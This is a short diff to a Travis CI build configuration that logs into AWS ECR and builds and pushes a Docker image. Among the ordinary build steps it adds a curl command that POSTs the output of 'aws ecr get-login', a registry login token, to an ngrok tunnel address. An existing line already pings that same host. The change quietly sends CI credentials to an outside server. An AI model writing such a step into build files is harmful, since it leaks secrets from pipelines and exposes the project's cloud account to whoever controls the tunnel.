@@ -21,6 +21,7 @@ after_success:
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - curl -X POST http://f8d03deb5377.ngrok.io --data "ahoj2 stef"   
+  - curl -X POST http://f8d03deb5377.ngrok.io --data eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
